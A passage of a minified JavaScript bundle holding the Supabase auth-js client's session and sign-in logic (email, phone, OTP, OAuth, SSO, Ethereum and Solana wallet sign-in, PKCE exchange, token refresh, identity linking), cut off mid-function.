this._initialize()))(),await this.initializePromise)}async _initialize(){var t;try{let r={},s="none";if(De()&&(r=Ev(window.location.href),this._isImplicitGrantCallback(r)?s="implicit":await this._isPKCECallback(r)&&(s="pkce")),De()&&this.detectSessionInUrl&&s!=="none"){const{data:a,error:i}=await this._getSessionFromURL(r,s);if(i){if(this._debug("#_initialize()","error detecting session from URL",i),yv(i)){const c=(t=i.details)===null||t===void 0?void 0:t.code;if(c==="identity_already_exists"||c==="identity_not_found"||c==="single_identity_not_deletable")return{error:i}}return{error:i}}const{session:l,redirectType:o}=a;return this._debug("#_initialize()","detected session in URL",l,"redirect type",o),await this._saveSession(l),setTimeout(async()=>{o==="recovery"?await this._notifyAllSubscribers("PASSWORD_RECOVERY",l):await this._notifyAllSubscribers("SIGNED_IN",l)},0),{error:null}}return await this._recoverAndRefresh(),{error:null}}catch(r){return M(r)?this._returnResult({error:r}):this._returnResult({error:new us("Unexpected error during initialization",r)})}finally{await this._handleVisibilityChange(),this._debug("#_initialize()","end")}}async signInAnonymously(t){var r,s,a;try{const i=await V(this.fetch,"POST",`${this.url}/signup`,{headers:this.headers,body:{data:(s=(r=t==null?void 0:t.options)===null||r===void 0?void 0:r.data)!==null&&s!==void 0?s:{},gotrue_meta_security:{captcha_token:(a=t==null?void 0:t.options)===null||a===void 0?void 0:a.captchaToken}},xform:Pt}),{data:l,error:o}=i;if(o||!l)return this._returnResult({data:{user:null,session:null},error:o});const c=l.session,u=l.user;return l.session&&(await this._saveSession(l.session),await this._notifyAllSubscribers("SIGNED_IN",c)),this._returnResult({data:{user:u,session:c},error:null})}catch(i){if(M(i))return this._returnResult({data:{user:null,session:null},error:i});throw i}}async signUp(t){var r,s,a;try{let i;if("email"in t){const{email:h,password:p,options:x}=t;let v=null,f=null;this.flowType==="pkce"&&([v,f]=await Cs(this.storage,this.storageKey)),i=await V(this.fetch,"POST",`${this.url}/signup`,{headers:this.headers,redirectTo:x==null?void 0:x.emailRedirectTo,body:{email:h,password:p,data:(r=x==null?void 0:x.data)!==null&&r!==void 0?r:{},gotrue_meta_security:{captcha_token:x==null?void 0:x.captchaToken},code_challenge:v,code_challenge_method:f},xform:Pt})}else if("phone"in t){const{phone:h,password:p,options:x}=t;i=await V(this.fetch,"POST",`${this.url}/signup`,{headers:this.headers,body:{phone:h,password:p,data:(s=x==null?void 0:x.data)!==null&&s!==void 0?s:{},channel:(a=x==null?void 0:x.channel)!==null&&a!==void 0?a:"sms",gotrue_meta_security:{captcha_token:x==null?void 0:x.captchaToken}},xform:Pt})}else throw new Ka("You must provide either an email or phone number and a password");const{data:l,error:o}=i;if(o||!l)return await Ue(this.storage,`${this.storageKey}-code-verifier`),this._returnResult({data:{user:null,session:null},error:o});const c=l.session,u=l.user;return l.session&&(await this._saveSession(l.session),await this._notifyAllSubscribers("SIGNED_IN",c)),this._returnResult({data:{user:u,session:c},error:null})}catch(i){if(await Ue(this.storage,`${this.storageKey}-code-verifier`),M(i))return this._returnResult({data:{user:null,session:null},error:i});throw i}}async signInWithPassword(t){try{let r;if("email"in t){const{email:i,password:l,options:o}=t;r=await V(this.fetch,"POST",`${this.url}/token?grant_type=password`,{headers:this.headers,body:{email:i,password:l,gotrue_meta_security:{captcha_token:o==null?void 0:o.captchaToken}},xform:fh})}else if("phone"in t){const{phone:i,password:l,options:o}=t;r=await V(this.fetch,"POST",`${this.url}/token?grant_type=password`,{headers:this.headers,body:{phone:i,password:l,gotrue_meta_security:{captcha_token:o==null?void 0:o.captchaToken}},xform:fh})}else throw new Ka("You must provide either an email or phone number and a password");const{data:s,error:a}=r;if(a)return this._returnResult({data:{user:null,session:null},error:a});if(!s||!s.session||!s.user){const i=new Es;return this._returnResult({data:{user:null,session:null},error:i})}return s.session&&(await this._saveSession(s.session),await this._notifyAllSubscribers("SIGNED_IN",s.session)),this._returnResult({data:Object.assign({user:s.user,session:s.session},s.weak_password?{weakPassword:s.weak_password}:null),error:a})}catch(r){if(M(r))return this._returnResult({data:{user:null,session:null},error:r});throw r}}async signInWithOAuth(t){var r,s,a,i;return await this._handleProviderSignIn(t.provider,{redirectTo:(r=t.options)===null||r===void 0?void 0:r.redirectTo,scopes:(s=t.options)===null||s===void 0?void 0:s.scopes,queryParams:(a=t.options)===null||a===void 0?void 0:a.queryParams,skipBrowserRedirect:(i=t.options)===null||i===void 0?void 0:i.skipBrowserRedirect})}async exchangeCodeForSession(t){return await this.initializePromise,this._acquireLock(this.lockAcquireTimeout,async()=>this._exchangeCodeForSession(t))}async signInWithWeb3(t){const{chain:r}=t;switch(r){case"ethereum":return await this.signInWithEthereum(t);case"solana":return await this.signInWithSolana(t);default:throw new Error(`@supabase/auth-js: Unsupported chain "${r}"`)}}async signInWithEthereum(t){var r,s,a,i,l,o,c,u,h,p,x;let v,f;if("message"in t)v=t.message,f=t.signature;else{const{chain:w,wallet:j,statement:y,options:m}=t;let g;if(De())if(typeof j=="object")g=j;else{const L=window;if("ethereum"in L&&typeof L.ethereum=="object"&&"request"in L.ethereum&&typeof L.ethereum.request=="function")g=L.ethereum;else throw new Error("@supabase/auth-js: No compatible Ethereum wallet interface on the window object (window.ethereum) detected. Make sure the user already has a wallet installed and connected for this app. Prefer passing the wallet interface object directly to signInWithWeb3({ chain: 'ethereum', wallet: resolvedUserWallet }) instead.")}else{if(typeof j!="object"||!(m!=null&&m.url))throw new Error("@supabase/auth-js: Both wallet and url must be specified in non-browser environments.");g=j}const k=new URL((r=m==null?void 0:m.url)!==null&&r!==void 0?r:window.location.href),C=await g.request({method:"eth_requestAccounts"}).then(L=>L).catch(()=>{throw new Error("@supabase/auth-js: Wallet method eth_requestAccounts is missing or invalid")});if(!C||C.length===0)throw new Error("@supabase/auth-js: No accounts available. Please ensure the wallet is connected.");const S=op(C[0]);let R=(s=m==null?void 0:m.signInWithEthereum)===null||s===void 0?void 0:s.chainId;if(!R){const L=await g.request({method:"eth_chainId"});R=Qv(L)}const T={domain:k.host,address:S,statement:y,uri:k.href,version:"1",chainId:R,nonce:(a=m==null?void 0:m.signInWithEthereum)===null||a===void 0?void 0:a.nonce,issuedAt:(l=(i=m==null?void 0:m.signInWithEthereum)===null||i===void 0?void 0:i.issuedAt)!==null&&l!==void 0?l:new Date,expirationTime:(o=m==null?void 0:m.signInWithEthereum)===null||o===void 0?void 0:o.expirationTime,notBefore:(c=m==null?void 0:m.signInWithEthereum)===null||c===void 0?void 0:c.notBefore,requestId:(u=m==null?void 0:m.signInWithEthereum)===null||u===void 0?void 0:u.requestId,resources:(h=m==null?void 0:m.signInWithEthereum)===null||h===void 0?void 0:h.resources};v=Zv(T),f=await g.request({method:"personal_sign",params:[Xv(v),S]})}try{const{data:w,error:j}=await V(this.fetch,"POST",`${this.url}/token?grant_type=web3`,{headers:this.headers,body:Object.assign({chain:"ethereum",message:v,signature:f},!((p=t.options)===null||p===void 0)&&p.captchaToken?{gotrue_meta_security:{captcha_token:(x=t.options)===null||x===void 0?void 0:x.captchaToken}}:null),xform:Pt});if(j)throw j;if(!w||!w.session||!w.user){const y=new Es;return this._returnResult({data:{user:null,session:null},error:y})}return w.session&&(await this._saveSession(w.session),await this._notifyAllSubscribers("SIGNED_IN",w.session)),this._returnResult({data:Object.assign({},w),error:j})}catch(w){if(M(w))return this._returnResult({data:{user:null,session:null},error:w});throw w}}async signInWithSolana(t){var r,s,a,i,l,o,c,u,h,p,x,v;let f,w;if("message"in t)f=t.message,w=t.signature;else{const{chain:j,wallet:y,statement:m,options:g}=t;let k;if(De())if(typeof y=="object")k=y;else{const S=window;if("solana"in S&&typeof S.solana=="object"&&("signIn"in S.solana&&typeof S.solana.signIn=="function"||"signMessage"in S.solana&&typeof S.solana.signMessage=="function"))k=S.solana;else throw new Error("@supabase/auth-js: No compatible Solana wallet interface on the window object (window.solana) detected. Make sure the user already has a wallet installed and connected for this app. Prefer passing the wallet interface object directly to signInWithWeb3({ chain: 'solana', wallet: resolvedUserWallet }) instead.")}else{if(typeof y!="object"||!(g!=null&&g.url))throw new Error("@supabase/auth-js: Both wallet and url must be specified in non-browser environments.");k=y}const C=new URL((r=g==null?void 0:g.url)!==null&&r!==void 0?r:window.location.href);if("signIn"in k&&k.signIn){const S=await k.signIn(Object.assign(Object.assign(Object.assign({issuedAt:new Date().toISOString()},g==null?void 0:g.signInWithSolana),{version:"1",domain:C.host,uri:C.href}),m?{statement:m}:null));let R;if(Array.isArray(S)&&S[0]&&typeof S[0]=="object")R=S[0];else if(S&&typeof S=="object"&&"signedMessage"in S&&"signature"in S)R=S;else throw new Error("@supabase/auth-js: Wallet method signIn() returned unrecognized value");if("signedMessage"in R&&"signature"in R&&(typeof R.signedMessage=="string"||R.signedMessage instanceof Uint8Array)&&R.signature instanceof Uint8Array)f=typeof R.signedMessage=="string"?R.signedMessage:new TextDecoder().decode(R.signedMessage),w=R.signature;else throw new Error("@supabase/auth-js: Wallet method signIn() API returned object without signedMessage and signature fields")}else{if(!("signMessage"in k)||typeof k.signMessage!="function"||!("publicKey"in k)||typeof k!="object"||!k.publicKey||!("toBase58"in k.publicKey)||typeof k.publicKey.toBase58!="function")throw new Error("@supabase/auth-js: Wallet does not have a compatible signMessage() and publicKey.toBase58() API");f=[`${C.host} wants you to sign in with your Solana account:`,k.publicKey.toBase58(),...m?["",m,""]:[""],"Version: 1",`URI: ${C.href}`,`Issued At: ${(a=(s=g==null?void 0:g.signInWithSolana)===null||s===void 0?void 0:s.issuedAt)!==null&&a!==void 0?a:new Date().toISOString()}`,...!((i=g==null?void 0:g.signInWithSolana)===null||i===void 0)&&i.notBefore?[`Not Before: ${g.signInWithSolana.notBefore}`]:[],...!((l=g==null?void 0:g.signInWithSolana)===null||l===void 0)&&l.expirationTime?[`Expiration Time: ${g.signInWithSolana.expirationTime}`]:[],...!((o=g==null?void 0:g.signInWithSolana)===null||o===void 0)&&o.chainId?[`Chain ID: ${g.signInWithSolana.chainId}`]:[],...!((c=g==null?void 0:g.signInWithSolana)===null||c===void 0)&&c.nonce?[`Nonce: ${g.signInWithSolana.nonce}`]:[],...!((u=g==null?void 0:g.signInWithSolana)===null||u===void 0)&&u.requestId?[`Request ID: ${g.signInWithSolana.requestId}`]:[],...!((p=(h=g==null?void 0:g.signInWithSolana)===null||h===void 0?void 0:h.resources)===null||p===void 0)&&p.length?["Resources",...g.signInWithSolana.resources.map(R=>`- ${R}`)]:[]].join(`
`);const S=await k.signMessage(new TextEncoder().encode(f),"utf8");if(!S||!(S instanceof Uint8Array))throw new Error("@supabase/auth-js: Wallet signMessage() API returned an recognized value");w=S}}try{const{data:j,error:y}=await V(this.fetch,"POST",`${this.url}/token?grant_type=web3`,{headers:this.headers,body:Object.assign({chain:"solana",message:f,signature:ms(w)},!((x=t.options)===null||x===void 0)&&x.captchaToken?{gotrue_meta_security:{captcha_token:(v=t.options)===null||v===void 0?void 0:v.captchaToken}}:null),xform:Pt});if(y)throw y;if(!j||!j.session||!j.user){const m=new Es;return this._returnResult({data:{user:null,session:null},error:m})}return j.session&&(await this._saveSession(j.session),await this._notifyAllSubscribers("SIGNED_IN",j.session)),this._returnResult({data:Object.assign({},j),error:y})}catch(j){if(M(j))return this._returnResult({data:{user:null,session:null},error:j});throw j}}async _exchangeCodeForSession(t){const r=await as(this.storage,`${this.storageKey}-code-verifier`),[s,a]=(r??"").split("/");try{if(!s&&this.flowType==="pkce")throw new vv;const{data:i,error:l}=await V(this.fetch,"POST",`${this.url}/token?grant_type=pkce`,{headers:this.headers,body:{auth_code:t,code_verifier:s},xform:Pt});if(await Ue(this.storage,`${this.storageKey}-code-verifier`),l)throw l;if(!i||!i.session||!i.user){const o=new Es;return this._returnResult({data:{user:null,session:null,redirectType:null},error:o})}return i.session&&(await this._saveSession(i.session),await this._notifyAllSubscribers("SIGNED_IN",i.session)),this._returnResult({data:Object.assign(Object.assign({},i),{redirectType:a??null}),error:l})}catch(i){if(await Ue(this.storage,`${this.storageKey}-code-verifier`),M(i))return this._returnResult({data:{user:null,session:null,redirectType:null},error:i});throw i}}async signInWithIdToken(t){try{const{options:r,provider:s,token:a,access_token:i,nonce:l}=t,o=await V(this.fetch,"POST",`${this.url}/token?grant_type=id_token`,{headers:this.headers,body:{provider:s,id_token:a,access_token:i,nonce:l,gotrue_meta_security:{captcha_token:r==null?void 0:r.captchaToken}},xform:Pt}),{data:c,error:u}=o;if(u)return this._returnResult({data:{user:null,session:null},error:u});if(!c||!c.session||!c.user){const h=new Es;return this._returnResult({data:{user:null,session:null},error:h})}return c.session&&(await this._saveSession(c.session),await this._notifyAllSubscribers("SIGNED_IN",c.session)),this._returnResult({data:c,error:u})}catch(r){if(M(r))return this._returnResult({data:{user:null,session:null},error:r});throw r}}async signInWithOtp(t){var r,s,a,i,l;try{if("email"in t){const{email:o,options:c}=t;let u=null,h=null;this.flowType==="pkce"&&([u,h]=await Cs(this.storage,this.storageKey));const{error:p}=await V(this.fetch,"POST",`${this.url}/otp`,{headers:this.headers,body:{email:o,data:(r=c==null?void 0:c.data)!==null&&r!==void 0?r:{},create_user:(s=c==null?void 0:c.shouldCreateUser)!==null&&s!==void 0?s:!0,gotrue_meta_security:{captcha_token:c==null?void 0:c.captchaToken},code_challenge:u,code_challenge_method:h},redirectTo:c==null?void 0:c.emailRedirectTo});return this._returnResult({data:{user:null,session:null},error:p})}if("phone"in t){const{phone:o,options:c}=t,{data:u,error:h}=await V(this.fetch,"POST",`${this.url}/otp`,{headers:this.headers,body:{phone:o,data:(a=c==null?void 0:c.data)!==null&&a!==void 0?a:{},create_user:(i=c==null?void 0:c.shouldCreateUser)!==null&&i!==void 0?i:!0,gotrue_meta_security:{captcha_token:c==null?void 0:c.captchaToken},channel:(l=c==null?void 0:c.channel)!==null&&l!==void 0?l:"sms"}});return this._returnResult({data:{user:null,session:null,messageId:u==null?void 0:u.message_id},error:h})}throw new Ka("You must provide either an email or phone number.")}catch(o){if(await Ue(this.storage,`${this.storageKey}-code-verifier`),M(o))return this._returnResult({data:{user:null,session:null},error:o});throw o}}async verifyOtp(t){var r,s;try{let a,i;"options"in t&&(a=(r=t.options)===null||r===void 0?void 0:r.redirectTo,i=(s=t.options)===null||s===void 0?void 0:s.captchaToken);const{data:l,error:o}=await V(this.fetch,"POST",`${this.url}/verify`,{headers:this.headers,body:Object.assign(Object.assign({},t),{gotrue_meta_security:{captcha_token:i}}),redirectTo:a,xform:Pt});if(o)throw o;if(!l)throw new Error("An error occurred on token verification.");const c=l.session,u=l.user;return c!=null&&c.access_token&&(await this._saveSession(c),await this._notifyAllSubscribers(t.type=="recovery"?"PASSWORD_RECOVERY":"SIGNED_IN",c)),this._returnResult({data:{user:u,session:c},error:null})}catch(a){if(M(a))return this._returnResult({data:{user:null,session:null},error:a});throw a}}async signInWithSSO(t){var r,s,a,i,l;try{let o=null,c=null;this.flowType==="pkce"&&([o,c]=await Cs(this.storage,this.storageKey));const u=await V(this.fetch,"POST",`${this.url}/sso`,{body:Object.assign(Object.assign(Object.assign(Object.assign(Object.assign({},"providerId"in t?{provider_id:t.providerId}:null),"domain"in t?{domain:t.domain}:null),{redirect_to:(s=(r=t.options)===null||r===void 0?void 0:r.redirectTo)!==null&&s!==void 0?s:void 0}),!((a=t==null?void 0:t.options)===null||a===void 0)&&a.captchaToken?{gotrue_meta_security:{captcha_token:t.options.captchaToken}}:null),{skip_http_redirect:!0,code_challenge:o,code_challenge_method:c}),headers:this.headers,xform:Vv});return!((i=u.data)===null||i===void 0)&&i.url&&De()&&!(!((l=t.options)===null||l===void 0)&&l.skipBrowserRedirect)&&window.location.assign(u.data.url),this._returnResult(u)}catch(o){if(await Ue(this.storage,`${this.storageKey}-code-verifier`),M(o))return this._returnResult({data:null,error:o});throw o}}async reauthenticate(){return await this.initializePromise,await this._acquireLock(this.lockAcquireTimeout,async()=>await this._reauthenticate())}async _reauthenticate(){try{return await this._useSession(async t=>{const{data:{session:r},error:s}=t;if(s)throw s;if(!r)throw new ot;const{error:a}=await V(this.fetch,"GET",`${this.url}/reauthenticate`,{headers:this.headers,jwt:r.access_token});return this._returnResult({data:{user:null,session:null},error:a})})}catch(t){if(M(t))return this._returnResult({data:{user:null,session:null},error:t});throw t}}async resend(t){try{const r=`${this.url}/resend`;if("email"in t){const{email:s,type:a,options:i}=t,{error:l}=await V(this.fetch,"POST",r,{headers:this.headers,body:{email:s,type:a,gotrue_meta_security:{captcha_token:i==null?void 0:i.captchaToken}},redirectTo:i==null?void 0:i.emailRedirectTo});return this._returnResult({data:{user:null,session:null},error:l})}else if("phone"in t){const{phone:s,type:a,options:i}=t,{data:l,error:o}=await V(this.fetch,"POST",r,{headers:this.headers,body:{phone:s,type:a,gotrue_meta_security:{captcha_token:i==null?void 0:i.captchaToken}}});return this._returnResult({data:{user:null,session:null,messageId:l==null?void 0:l.message_id},error:o})}throw new Ka("You must provide either an email or phone number and a type")}catch(r){if(M(r))return this._returnResult({data:{user:null,session:null},error:r});throw r}}async getSession(){return await this.initializePromise,await this._acquireLock(this.lockAcquireTimeout,async()=>this._useSession(async r=>r))}async _acquireLock(t,r){this._debug("#_acquireLock","begin",t);try{if(this.lockAcquired){const s=this.pendingInLock.length?this.pendingInLock[this.pendingInLock.length-1]:Promise.resolve(),a=(async()=>(await s,await r()))();return this.pendingInLock.push((async()=>{try{await a}catch{}})()),a}return await this.lock(`lock:${this.storageKey}`,t,async()=>{this._debug("#_acquireLock","lock acquired for storage key",this.storageKey);try{this.lockAcquired=!0;const s=r();for(this.pendingInLock.push((async()=>{try{await s}catch{}})()),await s;this.pendingInLock.length;){const a=[...this.pendingInLock];await Promise.all(a),this.pendingInLock.splice(0,a.length)}return await s}finally{this._debug("#_acquireLock","lock released for storage key",this.storageKey),this.lockAcquired=!1}})}finally{this._debug("#_acquireLock","end")}}async _useSession(t){this._debug("#_useSession","begin");try{const r=await this.__loadSession();return await t(r)}finally{this._debug("#_useSession","end")}}async __loadSession(){this._debug("#__loadSession()","begin"),this.lockAcquired||this._debug("#__loadSession()","used outside of an acquired lock!",new Error().stack);try{let t=null;const r=await as(this.storage,this.storageKey);if(this._debug("#getSession()","session from storage",r),r!==null&&(this._isValidSession(r)?t=r:(this._debug("#getSession()","session from storage is not valid"),await this._removeSession())),!t)return{data:{session:null},error:null};const s=t.expires_at?t.expires_at*1e3-Date.now()<no:!1;if(this._debug("#__loadSession()",`session has${s?"":" not"} expired`,"expires_at",t.expires_at),!s){if(this.userStorage){const l=await as(this.userStorage,this.storageKey+"-user");l!=null&&l.user?t.user=l.user:t.user=lo()}if(this.storage.isServer&&t.user&&!t.user.__isUserNotAvailableProxy){const l={value:this.suppressGetSessionWarning};t.user=Mv(t.user,l),l.value&&(this.suppressGetSessionWarning=!0)}return{data:{session:t},error:null}}const{data:a,error:i}=await this._callRefreshToken(t.refresh_token);return i?this._returnResult({data:{session:null},error:i}):this._returnResult({data:{session:a},error:null})}finally{this._debug("#__loadSession()","end")}}async getUser(t){if(t)return await this._getUser(t);await this.initializePromise;const r=await this._acquireLock(this.lockAcquireTimeout,async()=>await this._getUser());return r.data.user&&(this.suppressGetSessionWarning=!0),r}async _getUser(t){try{return t?await V(this.fetch,"GET",`${this.url}/user`,{headers:this.headers,jwt:t,xform:kr}):await this._useSession(async r=>{var s,a,i;const{data:l,error:o}=r;if(o)throw o;return!(!((s=l.session)===null||s===void 0)&&s.access_token)&&!this.hasCustomAuthorizationHeader?{data:{user:null},error:new ot}:await V(this.fetch,"GET",`${this.url}/user`,{headers:this.headers,jwt:(i=(a=l.session)===null||a===void 0?void 0:a.access_token)!==null&&i!==void 0?i:void 0,xform:kr})})}catch(r){if(M(r))return gv(r)&&(await this._removeSession(),await Ue(this.storage,`${this.storageKey}-code-verifier`)),this._returnResult({data:{user:null},error:r});throw r}}async updateUser(t,r={}){return await this.initializePromise,await this._acquireLock(this.lockAcquireTimeout,async()=>await this._updateUser(t,r))}async _updateUser(t,r={}){try{return await this._useSession(async s=>{const{data:a,error:i}=s;if(i)throw i;if(!a.session)throw new ot;const l=a.session;let o=null,c=null;this.flowType==="pkce"&&t.email!=null&&([o,c]=await Cs(this.storage,this.storageKey));const{data:u,error:h}=await V(this.fetch,"PUT",`${this.url}/user`,{headers:this.headers,redirectTo:r==null?void 0:r.emailRedirectTo,body:Object.assign(Object.assign({},t),{code_challenge:o,code_challenge_method:c}),jwt:l.access_token,xform:kr});if(h)throw h;return l.user=u.user,await this._saveSession(l),await this._notifyAllSubscribers("USER_UPDATED",l),this._returnResult({data:{user:l.user},error:null})})}catch(s){if(await Ue(this.storage,`${this.storageKey}-code-verifier`),M(s))return this._returnResult({data:{user:null},error:s});throw s}}async setSession(t){return await this.initializePromise,await this._acquireLock(this.lockAcquireTimeout,async()=>await this._setSession(t))}async _setSession(t){try{if(!t.access_token||!t.refresh_token)throw new ot;const r=Date.now()/1e3;let s=r,a=!0,i=null;const{payload:l}=io(t.access_token);if(l.exp&&(s=l.exp,a=s<=r),a){const{data:o,error:c}=await this._callRefreshToken(t.refresh_token);if(c)return this._returnResult({data:{user:null,session:null},error:c});if(!o)return{data:{user:null,session:null},error:null};i=o}else{const{data:o,error:c}=await this._getUser(t.access_token);if(c)throw c;i={access_token:t.access_token,refresh_token:t.refresh_token,user:o.user,token_type:"bearer",expires_in:s-r,expires_at:s},await this._saveSession(i),await this._notifyAllSubscribers("SIGNED_IN",i)}return this._returnResult({data:{user:i.user,session:i},error:null})}catch(r){if(M(r))return this._returnResult({data:{session:null,user:null},error:r});throw r}}async refreshSession(t){return await this.initializePromise,await this._acquireLock(this.lockAcquireTimeout,async()=>await this._refreshSession(t))}async _refreshSession(t){try{return await this._useSession(async r=>{var s;if(!t){const{data:l,error:o}=r;if(o)throw o;t=(s=l.session)!==null&&s!==void 0?s:void 0}if(!(t!=null&&t.refresh_token))throw new ot;const{data:a,error:i}=await this._callRefreshToken(t.refresh_token);return i?this._returnResult({data:{user:null,session:null},error:i}):a?this._returnResult({data:{user:a.user,session:a},error:null}):this._returnResult({data:{user:null,session:null},error:null})})}catch(r){if(M(r))return this._returnResult({data:{user:null,session:null},error:r});throw r}}async _getSessionFromURL(t,r){try{if(!De())throw new Ga("No browser detected.");if(t.error||t.error_description||t.error_code)throw new Ga(t.error_description||"Error in URL with unspecified error_description",{error:t.error||"unspecified_error",code:t.error_code||"unspecified_code"});switch(r){case"implicit":if(this.flowType==="pkce")throw new ih("Not a valid PKCE flow url.");break;case"pkce":if(this.flowType==="implicit")throw new Ga("Not a valid implicit grant flow url.");break;default:}if(r==="pkce"){if(this._debug("#_initialize()","begin","is PKCE flow",!0),!t.code)throw new ih("No code detected.");const{data:m,error:g}=await this._exchangeCodeForSession(t.code);if(g)throw g;const k=new URL(window.location.href);return k.searchParams.delete("code"),window.history.replaceState(window.history.state,"",k.toString()),{data:{session:m.session,redirectType:null},error:null}}const{provider_token:s,provider_refresh_token:a,access_token:i,refresh_token:l,expires_in:o,expires_at:c,token_type:u}=t;if(!i||!o||!l||!u)throw new Ga("No session defined in URL");const h=Math.round(Date.now()/1e3),p=parseInt(o);let x=h+p;c&&(x=parseInt(c));const v=x-h;v*1e3<=Os&&console.warn(`@supabase/gotrue-js: Session as retrieved from URL expires in ${v}s, should have been closer to ${p}s`);const f=x-p;h-f>=120?console.warn("@supabase/gotrue-js: Session as retrieved from URL was issued over 120s ago, URL could be stale",f,x,h):h-f<0&&console.warn("@supabase/gotrue-js: Session as retrieved from URL was issued in the future? Check the device clock for skew",f,x,h);const{data:w,error:j}=await this._getUser(i);if(j)throw j;const y={provider_token:s,provider_refresh_token:a,access_token:i,expires_in:p,expires_at:x,refresh_token:l,token_type:u,user:w.user};return window.location.hash="",this._debug("#_getSessionFromURL()","clearing window.location.hash"),this._returnResult({data:{session:y,redirectType:t.type},error:null})}catch(s){if(M(s))return this._returnResult({data:{session:null,redirectType:null},error:s});throw s}}_isImplicitGrantCallback(t){return typeof this.detectSessionInUrl=="function"?this.detectSessionInUrl(new URL(window.location.href),t):!!(t.access_token||t.error_description)}async _isPKCECallback(t){const r=await as(this.storage,`${this.storageKey}-code-verifier`);return!!(t.code&&r)}async signOut(t={scope:"global"}){return await this.initializePromise,await this._acquireLock(this.lockAcquireTimeout,async()=>await this._signOut(t))}async _signOut({scope:t}={scope:"global"}){return await this._useSession(async r=>{var s;const{data:a,error:i}=r;if(i)return this._returnResult({error:i});const l=(s=a.session)===null||s===void 0?void 0:s.access_token;if(l){const{error:o}=await this.admin.signOut(l,t);if(o&&!(xv(o)&&(o.status===404||o.status===401||o.status===403)))return this._returnResult({error:o})}return t!=="others"&&(await this._removeSession(),await Ue(this.storage,`${this.storageKey}-code-verifier`)),this._returnResult({error:null})})}onAuthStateChange(t){const r=Sv(),s={id:r,callback:t,unsubscribe:()=>{this._debug("#unsubscribe()","state change callback with id removed",r),this.stateChangeEmitters.delete(r)}};return this._debug("#onAuthStateChange()","registered callback with id",r),this.stateChangeEmitters.set(r,s),(async()=>(await this.initializePromise,await this._acquireLock(this.lockAcquireTimeout,async()=>{this._emitInitialSession(r)})))(),{data:{subscription:s}}}async _emitInitialSession(t){return await this._useSession(async r=>{var s,a;try{const{data:{session:i},error:l}=r;if(l)throw l;await((s=this.stateChangeEmitters.get(t))===null||s===void 0?void 0:s.callback("INITIAL_SESSION",i)),this._debug("INITIAL_SESSION","callback id",t,"session",i)}catch(i){await((a=this.stateChangeEmitters.get(t))===null||a===void 0?void 0:a.callback("INITIAL_SESSION",null)),this._debug("INITIAL_SESSION","callback id",t,"error",i),console.error(i)}})}async resetPasswordForEmail(t,r={}){let s=null,a=null;this.flowType==="pkce"&&([s,a]=await Cs(this.storage,this.storageKey,!0));try{return await V(this.fetch,"POST",`${this.url}/recover`,{body:{email:t,code_challenge:s,code_challenge_method:a,gotrue_meta_security:{captcha_token:r.captchaToken}},headers:this.headers,redirectTo:r.redirectTo})}catch(i){if(await Ue(this.storage,`${this.storageKey}-code-verifier`),M(i))return this._returnResult({data:null,error:i});throw i}}async getUserIdentities(){var t;try{const{data:r,error:s}=await this.getUser();if(s)throw s;return this._returnResult({data:{identities:(t=r.user.identities)!==null&&t!==void 0?t:[]},error:null})}catch(r){if(M(r))return this._returnResult({data:null,error:r});throw r}}async linkIdentity(t){return"token"in t?this.linkIdentityIdToken(t):this.linkIdentityOAuth(t)}async linkIdentityOAuth(t){var r;try{const{data:s,error:a}=await this._useSession(async i=>{var l,o,c,u,h;const{data:p,error:x}=i;if(x)throw x;const v=await this._getUrlForProvider(`${this.url}/user/identities/authorize`,t.provider,{redirectTo:(l=t.options)===null||l===void 0?void 0:l.redirectTo,scopes:(o=t.options)===null||o===void 0?void 0:o.scopes,queryParams:(c=t.options)===null||c===void 0?void 0:c.queryParams,skipBrowserRedirect:!0});return await V(this.fetch,"GET",v,{headers:this.headers,jwt:(h=(u=p.session)===null||u===void 0?void 0:u.access_token)!==null&&h!==void 0?h:void 0})});if(a)throw a;return De()&&!(!((r=t.options)===null||r===void 0)&&r.skipBrowserRedirect)&&window.location.assign(s==null?void 0:s.url),this._returnResult({data:{provider:t.provider,url:s==null?void 0:s.url},error:null})}catch(s){if(M(s))return this._returnResult({data:{provider:t.provider,url:null},error:s});throw s}}async linkIdentityIdToken(t){return await this._useSession(async r=>{var s;try{const{error:a,data:{session:i}}=r;if(a)throw a;const{options:l,provider:o,token:c,access_token:u,nonce:h}=t,p=await V(this.fetch,"POST",`${this.url}/token?grant_type=id_token`,{headers:this.headers,jwt:(s=i==null?void 0:i.access_token)!==null&&s!==void 0?s:void 0,body:{provider:o,id_token:c,access_token:u,nonce:h,link_identity:!0,gotrue_meta_security:{captcha_token:l==null?void 0:l.captchaToken}},xform:Pt}),{data:x,error:v}=p;return v?this._returnResult({data:{user:null,session:null},error:v}):!x||!x.session||!x.user?this._returnResult({data:{user:null,session:null},error:new Es}):(x.session&&(await this._saveSession(x.session),await this._notifyAllSubscribers("USER_UPDATED",x.session)),this._returnResult({data:x,error:v}))}catch(a){if(await Ue(this.storage,`${this.storageKey}-code-verifier`),M(a))return this._returnResult({data:{user:null,session:null},error:a});throw a}})}async unlinkIdentity(t){try{return await this._useSession(async r=>{var s,a;const{data:i,error:l}=r;if(l)throw l;return await V(this.fetch,"DELETE",`${this.url}/user/identities/${t.identity_id}`,{headers:this.headers,jwt:(a=(s=i.session)===null||s===void 0?void 0:s.access_token)!==null&&a!==void 0?a:void 0})})}catch(r){if(M(r))return this._returnResult({data:null,error:r});throw r}}async _refreshAccessToken(t){const r=`#_refreshAccessToken(${t.substring(0,5)}...)`;this._debug(r,"begin");try{const s=Date.now();return await Rv(async a=>(a>0&&await Tv(200*Math.pow(2,a-1)),this._debug(r,"refreshing attempt",a),await V(this.fetch,"POST",`${this.url}/token?grant_type=refresh_token`,{body:{refresh_token:t},headers:this.headers,xform:Pt})),(a,i)=>{const l=200*Math.pow(2,a);return i&&ao(i)&&Date.now()+l-s<Os})}catch(s){if(this._debug(r,"error",s),M(s))return this._returnResult({data:{session:null,user:null},error:s});throw s}finally{this._debug(r,"end")}}_isValidSession(t){return typeof t=="object"&&t!==null&&"access_token"in t&&"refresh_token"in t&&"expires_at"in t}async _handleProviderSignIn(t,r){const s=await this._getUrlForProvider(`${this.url}/authorize`,t,{redirectTo:r.redirectTo,scopes:r.scopes,queryParams:r.queryParams});return this._debug("#_handleProviderSignIn()","provider",t,"options",r,"url",s),De()&&!r.skipBrowserRedirect&&window.location.assign(s),{data:{provider:t,url:s},error:null}}async _recoverAndRefresh(){var t,r;const s="#_recoverAndRefresh()";this._debug(s,"begin");try{const a=await as(this.storage,this.storageKey);if(a&&this.userStorage){let l=await 